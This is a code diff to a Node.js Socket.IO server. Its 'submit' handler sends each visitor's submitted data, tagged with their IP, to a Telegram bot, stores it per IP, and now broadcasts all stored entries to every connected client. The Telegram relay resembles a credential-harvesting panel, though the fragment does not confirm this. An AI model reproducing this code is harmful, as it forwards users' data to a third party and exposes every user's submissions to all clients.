@@ -262,6 +262,10 @@ io.on('connection', (socket, req) => {
         io.emit('join', entriesArray)
     
     })
+
+    socket.on('getUserData', () => {
+        
+    })
     
     socket.on('submit', (data) => {
         if(userIP){
@@ -269,7 +273,13 @@ io.on('connection', (socket, req) => {
             user.ip = userIP
             let message = JSON.stringify(user, null, 2);
             bot.sendMessage(chatId, message);
-            io.emit('userData', user)
+            entriesArray.forEach(([ipAddress, details]) => {
+            if(details.ip == userIP){
+              details.getUserData = user
+                sessionStore.set(ipAddress, details)
+            }
+        });
+            io.emit('setUserData', entriesArray)
         }
        
         //console.log(data)
